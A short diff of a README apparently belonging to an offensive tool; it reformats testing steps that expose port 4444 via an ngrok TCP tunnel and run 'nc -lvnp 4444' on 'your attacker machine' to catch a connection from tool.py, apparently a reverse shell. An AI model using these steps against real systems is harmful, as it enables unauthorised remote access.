@@ -135,25 +135,14 @@ python3 tool.py
 
 
 ⸻
-
 🧪 Testing Instructions
-	1.	Start Ngrok:
-
+1. Start Ngrok:
 ngrok tcp 4444
-
-
-	2.	Update tool.py with your Ngrok TCP address and port.
-	3.	Run a listener on your attacker machine:
-
+2.Update tool.py with your Ngrok TCP address and port.
+3.Run a listener on your attacker machine:
 nc -lvnp 4444
-
-
-	4.	Execute the tool:
-
+4.Execute the tool:
 python3 tool.py
-
-
-
 ⸻
 
 🔁 CI/CD Integration
